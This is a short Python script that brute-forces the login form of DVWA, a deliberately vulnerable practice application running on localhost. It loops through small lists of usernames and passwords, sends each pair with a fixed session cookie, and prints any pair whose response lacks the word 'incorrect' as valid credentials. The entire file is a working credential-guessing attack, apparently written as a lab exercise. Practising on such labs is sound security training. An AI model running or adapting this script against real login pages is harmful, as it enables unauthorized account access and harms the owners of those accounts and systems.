import requests

URL = 'http://localhost/DVWA/vulnerabilities/brute/'

users = ['root', 'user', 'admin']
passwords = ['admin', '1234', 'password']

cookies = {
    'PHPSESSID':'9561b9fc42a4cd53c84a71e93fdfebb2',
    'security':'imposible'
}

for user in users:
    for password in passwords:
        print(f"Trying username={user} and password={password}")
        payload=f'?username={user}&password={password}&Login=Login'
        req = requests.get(URL + payload,cookies=cookies)
        if not 'incorrect' in req.text:
            print(f"Valid Credentials: {user}:{password}")